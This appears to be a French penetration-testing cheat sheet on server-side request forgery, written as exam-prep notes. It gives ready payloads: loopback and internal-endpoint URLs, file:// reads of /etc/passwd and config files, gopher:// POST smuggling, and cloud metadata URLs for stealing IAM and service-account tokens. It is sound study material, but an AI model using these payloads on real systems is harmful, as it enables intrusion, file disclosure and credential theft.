# SSRF — Server-Side Request Forgery

## 1. Concept

Le SSRF force le serveur à envoyer une requête HTTP **en son nom**. Comme la requête part du serveur, elle peut atteindre des ressources inaccessibles depuis l'extérieur : services internes, interfaces admin, fichiers locaux, métadonnées cloud.

---

## 2. Où chercher

Tout paramètre qui ressemble à une URL ou un chemin de ressource :

```
?url=
?link=
?src=
?path=
?feed=
?webhook=
?callback=
?image=
?load=
?fetch=
```

**Fonctionnalités typiquement vulnérables :**

- Import de flux RSS / Atom
- "Prévisualiser ce lien"
- Upload d'image depuis une URL
- Webhooks
- Export PDF / screenshot de page
- Proxy d'images ou de fichiers

---

## 3. Confirmation de la vulnérabilité

**Méthode : faire rappeler son propre serveur**

```bash
# Sur Kali
sudo service apache2 start
sudo tail -f /var/log/apache2/access.log

# Ou python
python3 -m http.server 80
```

Injecter dans le paramètre vulnérable :
```
http://KALI_IP/test
```

Si une requête GET apparaît dans les logs → **SSRF confirmé** ✅

L'agent utilisateur dans les logs révèle souvent le langage côté serveur :
```
python-requests/2.26.0  → Python
curl/7.74.0             → curl
Java/11.0               → Java
```

---

## 4. Exploitation — Accès services internes

### 4.1 Loopback / localhost

```
http://127.0.0.1/admin
http://localhost/admin
http://0.0.0.0/admin
http://[::1]/admin
```

### 4.2 Enumérer les endpoints internes

```
http://127.0.0.1/
http://127.0.0.1/api
http://127.0.0.1/status
http://backend/
http://internal-service/
```

La réponse peut exposer une liste d'endpoints comme :
```json
{
  "Endpoints": ["/flag", "/login", "/admin"],
  "Status": "Ok"
}
```

### 4.3 Contourner l'authentification (microservices)

Les microservices ne vérifient souvent pas l'authentification pour le trafic interne :

```
# Endpoint inaccessible depuis l'extérieur
http://ssrf-sandbox/flag → "You must be authenticated"

# Même endpoint via SSRF (requête vient de l'intérieur)
http://localhost/flag → {"Flag": "..."}
```

---

## 5. Schémas URL alternatifs

La puissance du SSRF dépend de ce que l'agent utilisateur supporte.

| Schéma      | Usage                     | Support                 |
|-------------|---------------------------|-------------------------|
| `http://`   | Accès services HTTP       | Universel               |
| `https://`  | Accès services HTTPS      | Universel               |
| `file:///`  | Lecture fichiers locaux   | curl, certains parseurs |
| `gopher://` | Requêtes multi-protocoles | curl                    |
| `ftp://`    | Serveurs FTP              | curl                    |
| `dict://`   | Dictionnaire TCP          | curl                    |

### 5.1 Schéma file:// — Lecture de fichiers

```
file:///etc/passwd
file:///etc/hosts
file:///app/config.ini
file:///var/www/html/config.php
file:///root/flag.txt
file:///C:/windows/win.ini
```

!!! warning "Dépend de l'agent"
    La bibliothèque Python `requests` ne supporte **pas** `file://`.  
    `curl` le supporte. Tester les deux si l'appli propose un choix d'agent.

### 5.2 Schéma gopher:// — Requêtes POST et protocoles custom

Gopher permet d'injecter des headers et du body → envoyer des POST, bypass restrictions GET.

**Format de base :**
```
gopher://HOST:PORT/_PAYLOAD
```

Le premier caractère du path est tronqué → utiliser `_` comme préfixe.

**GET via gopher :**
```
gopher://127.0.0.1:80/_GET%20/status%20HTTP/1.1%0a
```

**POST via gopher :**
```
gopher://127.0.0.1:80/_POST%20/login%20HTTP/1.1%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A%2029%0D%0A%0D%0Ausername%3Dadmin%26password%3Dtest
```

!!! tip "Double encodage"
    Quand la requête passe par le navigateur → les `%` sont encodés en `%25` → les espaces deviennent `%2520`.  
    Dans Burp Repeater → encoder une seule fois.

---

## 6. Métadonnées cloud

Si la cible est hébergée dans le cloud :

```
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Google Cloud
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01

# Custom (lab)
http://metadata.web200.local/latest/meta-data/
```

**Enumérer progressivement :**
```
http://169.254.169.254/
→ 1.0 / latest

http://169.254.169.254/latest/
→ meta-data / user-data

http://169.254.169.254/latest/meta-data/
→ liste des clés disponibles
```

---

## 7. Cas complexe : résultat indirect (Group Office-like)

Parfois le résultat n'est pas retourné directement — il faut exploiter une autre fonctionnalité de l'app pour récupérer les données :

```
1. SSRF sur /api/upload → envoyer file:///etc/passwd → reçoit un blobId
2. Utiliser /api/download?blob=BLOBID → récupérer le contenu du fichier
```

Penser à explorer toutes les fonctionnalités de l'app pour trouver le "canal de sortie".

---

## 8. GopherGun — Générer les payloads gopher

```bash
# Outil : https://github.com/EragonKashyap11/GopherGun
python3 GopherGun.py

# Interactive mode :
# Method : POST
# Host   : localhost
# Port   : 80
# Path   : /api/login
# Headers: Content-Type: application/x-www-form-urlencoded
# Body   : username=admin&password=test
```

---

## 9. Workflow exam

```
1. Identifier les paramètres qui acceptent des URLs
   → ?url=, ?feed=, ?src=, ?link=...

2. Confirmer la vulnérabilité
   → Pointer vers son propre serveur HTTP (logs Apache/Python)

3. Accéder aux ressources internes
   → http://localhost/, http://127.0.0.1/, http://backend/

4. Enumérer les endpoints internes
   → Tester /admin, /api, /status, /flag

5. Tester les schémas alternatifs
   → file:// pour lire des fichiers config, passwd
   → gopher:// si POST nécessaire

6. En environnement cloud
   → http://169.254.169.254/latest/meta-data/

7. Si résultat non visible
   → Chercher un canal de sortie indirect dans l'appli
   → Utiliser un serveur OOB (logs Apache)
```

!!! tip "Astuce exam"
    Toujours tester `http://localhost` **et** `http://127.0.0.1` **et** `http://0.0.0.0`   
    certains filtres bloquent l'un mais pas l'autre.